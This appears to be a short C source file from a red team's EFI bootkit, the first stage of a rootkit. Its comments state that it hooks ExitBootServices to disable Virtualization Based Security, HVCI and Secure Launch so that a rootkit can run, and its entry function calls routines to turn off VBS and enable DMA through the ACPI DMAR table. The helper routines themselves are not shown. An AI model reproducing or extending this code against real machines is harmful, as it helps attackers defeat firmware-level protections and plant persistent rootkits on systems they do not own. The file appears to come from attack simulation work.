/*!
 *
 * PREBOOT
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Inserts a hook into EFI_SYSTEM_TABLE->ExitBootServices and disables the creation
 * of Virtualization Based Security. As a result, VBS, HVCI, and Secure Launch will
 * fail to initialize and our generic rootkit will execute successfully.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI Entry_Stage1( _In_ EFI_SYSTEM_TABLE* SystemTable )
{
	EFI_STATUS	Est = EFI_SUCCESS;

	/* Toggle off virtualization based security */
	Est = VbsDisable( SystemTable );

	/* Did we succeed?! */
	if ( Est == EFI_SUCCESS ) {
		/* Look for the ACPI DMAR Table */
		Est = AcpiEnableDma( SystemTable );
	};

	/* Return the status */
	return Est;
};
